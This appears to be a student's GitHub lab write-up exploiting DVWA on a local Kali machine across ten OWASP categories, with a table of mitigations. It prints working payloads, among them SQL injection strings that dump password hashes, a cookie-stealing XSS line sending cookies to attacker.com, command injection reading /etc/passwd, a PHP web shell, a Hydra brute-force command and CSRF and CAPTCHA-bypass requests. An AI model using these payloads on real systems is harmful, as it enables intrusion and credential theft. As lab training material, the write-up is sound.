#  OWASP Top 10 Lab — DVWA

![Status](https://img.shields.io/badge/Status-Complete-2dd4bf?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-DVWA-f4a261?style=flat-square)
![OS](https://img.shields.io/badge/OS-Kali_Linux_2025.4-2dd4bf?style=flat-square)
![Score](https://img.shields.io/badge/Vulnerabilities-10%2F10-f4a261?style=flat-square)

> Hands-on exploitation of all OWASP Top 10 vulnerability categories using Damn Vulnerable Web Application (DVWA) on Kali Linux. Each vulnerability is demonstrated with real payloads, documented attack chains, and screenshots.

---

##  Project Overview

This lab demonstrates practical web application security testing by exploiting intentionally vulnerable web applications. The goal is to understand how each vulnerability works from an attacker's perspective, and how to detect and mitigate them.

**Environment:**
- **Attack Machine:** Kali Linux 2025.4
- **Target:** DVWA (Damn Vulnerable Web Application)
- **Web Server:** Apache 2.4 + PHP 8.4 + MariaDB
- **Tools Used:** Burp Suite, SQLMap, Hydra, curl, browser DevTools

---

##  Lab Setup

```bash
# Start services
sudo service apache2 start
sudo service mariadb start

# Access DVWA
http://localhost/DVWA

# Credentials
Username: admin
Password: password

# Set security level to Low for all demonstrations
DVWA Security → Low → Submit
```

---

##  Vulnerability Coverage — 10/10

| # | Vulnerability | Technique | Result |
|---|--------------|-----------|--------|
| 1 | SQL Injection | UNION-based + Boolean | Full DB dump + Password hashes cracked |
| 2 | XSS Reflected | Script injection via input | Alert popup + Cookie theft PoC |
| 3 | XSS Stored | Persistent script in DB | Permanent payload affecting all users |
| 4 | XSS DOM | URL parameter manipulation | Client-side script execution |
| 5 | Command Injection | OS command chaining | /etc/passwd dump + RCE |
| 6 | CSRF | Malicious URL crafting | Admin password changed silently |
| 7 | File Inclusion (LFI) | Path traversal | /etc/passwd read via URL |
| 8 | File Upload | PHP web shell upload | Full Remote Code Execution |
| 9 | Brute Force | Hydra dictionary attack | Valid credentials found |
| 10 | Insecure CAPTCHA | Step parameter bypass | Password changed without CAPTCHA |

---

##  1. SQL Injection

**Type:** UNION-based + Boolean blind

**Payloads used:**
```sql
-- Dump all users
1' OR '1'='1

-- Extract database version
1' UNION SELECT null, version() -- -

-- Extract database name
1' UNION SELECT null, database() -- -

-- Extract all tables
1' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- -

-- Dump password hashes
1' UNION SELECT user, password FROM users -- -
```

**Result:** Extracted all user credentials. MD5 hash cracked using CrackStation:
```
admin : 5f4dcc3b5aa765d61d8327deb882cf99 → password
```

 Screenshots: `screenshots/sqli/`

---

##  2. XSS Reflected

**Payload:**
```html
<script>alert('XSS by Sana')</script>
```

**Impact:** Script executes in victim's browser via crafted URL. Real-world use: session cookie theft, phishing.

**Cookie theft PoC:**
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

 Screenshots: `screenshots/xss-reflected/`

---

##  3. XSS Stored

**Payload injected in guestbook message field:**
```html
<script>alert('Stored XSS by Sana - Permanent!')</script>
```

**Impact:** Script stored in database — executes for every user who visits the page. More dangerous than Reflected XSS.

 Screenshots: `screenshots/xss-stored/`

---

##  4. XSS DOM

**Attack via URL:**
```
http://localhost/DVWA/vulnerabilities/xss_d/?default=<script>alert('DOM XSS by Sana')</script>
```

**Impact:** No server involvement — browser processes the malicious URL directly via DOM manipulation.

 Screenshots: `screenshots/xss-dom/`

---

##  5. Command Injection

**Payloads:**
```bash
# Identify server user
127.0.0.1; whoami
→ www-data

# Read sensitive file
127.0.0.1; cat /etc/passwd
→ Full /etc/passwd dump

# Get user ID
127.0.0.1; id
→ uid=33(www-data) gid=33(www-data)
```

**Impact:** Full Remote Code Execution on the server — attacker can run any OS command.

 Screenshots: `screenshots/command-injection/`

---

##  6. CSRF

**Attack:** Crafted URL that changes admin password without user interaction:

```
http://localhost/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

**Impact:** Victim's password changed silently just by visiting a malicious link.

 Screenshots: `screenshots/csrf/`

---

##  7. File Inclusion (LFI)

**Payload:**
```
http://localhost/DVWA/vulnerabilities/fi/?page=/etc/passwd
```

**Impact:** Server reads and displays arbitrary local files — sensitive config files, credentials, logs.

 Screenshots: `screenshots/file-inclusion/`

---

##  8. File Upload — PHP Web Shell

**Step 1:** Create malicious PHP shell:
```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

**Step 2:** Upload `shell.php` via DVWA file upload form

**Step 3:** Execute commands via URL:
```
http://localhost/DVWA/hackable/uploads/shell.php?cmd=whoami
→ www-data

http://localhost/DVWA/hackable/uploads/shell.php?cmd=id
→ uid=33(www-data) gid=33(www-data)

http://localhost/DVWA/hackable/uploads/shell.php?cmd=cat+/etc/passwd
→ Full /etc/passwd dump
```

**Impact:** Full RCE — attacker controls the server completely.

 Screenshots: `screenshots/file-upload/`

---

##  9. Brute Force

**Tool:** Hydra v9.6

**Command:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost \
http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect."
```

**Result:** Valid credentials found:
```
[80][http-get-form] host: localhost   login: admin   password: password ✅
```

**Impact:** Weak passwords cracked in seconds using dictionary attack.

 Screenshots: `screenshots/brute-force/`

---

##  10. Insecure CAPTCHA Bypass

**Vulnerability:** DVWA Low security level skips CAPTCHA validation at step 2.

**Source code analysis revealed:**
```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // No CAPTCHA check here!
    // Directly changes password
}
```

**Exploit:**
```bash
curl -X POST -b "PHPSESSID=<session_id>; security=low" \
"http://localhost/DVWA/vulnerabilities/captcha/" \
-d "step=2&password_new=hacked123&password_conf=hacked123&Change=Change"
```

**Result:**
```
Password Changed. ✅
```

**Impact:** CAPTCHA completely bypassed by jumping directly to step 2 — no bot protection.

 Screenshots: `screenshots/captcha-bypass/`

---

##  Repository Structure

```
owasp-top10-lab/
├── README.md
└── screenshots/
    ├── sqli/
    ├── xss-reflected/
    ├── xss-stored/
    ├── xss-dom/
    ├── command-injection/
    ├── csrf/
    ├── file-inclusion/
    ├── file-upload/
    ├── brute-force/
    └── captcha-bypass/
```

---

##  Key Learnings

- Manual SQL Injection without automated tools — UNION, Boolean, Error-based
- Three types of XSS and their different impact levels
- How CSRF tokens protect against request forgery
- File upload validation bypass using PHP web shells
- LFI path traversal and sensitive file exposure
- CAPTCHA implementation flaws and step-based bypasses
- Brute force automation with Hydra against web login forms
- Source code review to identify logic flaws (CAPTCHA bypass)

---

##  Mitigations

| Vulnerability | Fix |
|--------------|-----|
| SQL Injection | Parameterized queries / Prepared statements |
| XSS | Output encoding + CSP headers |
| CSRF | CSRF tokens + SameSite cookies |
| File Upload | Whitelist file types + rename uploads |
| File Inclusion | Whitelist allowed files, disable allow_url_include |
| Brute Force | Rate limiting + Account lockout + MFA |
| CAPTCHA | Validate CAPTCHA server-side at every step |

---

##  Author

**Sana Simran**
-  Portfolio: [sanasimran.github.io](https://sanasimran1403-jpg.github.io)
-  LinkedIn: [linkedin.com/in/sanasimran](www.linkedin.com/in/sanasimrannn)
-  GitHub: [@sanasimran1403-jpg](https://github.com/sanasimran1403-jpg)

---

>  **Disclaimer:** This lab is strictly for educational purposes. All attacks were performed on intentionally vulnerable software in an isolated local environment. Never use these techniques on systems you do not own or have explicit permission to test.
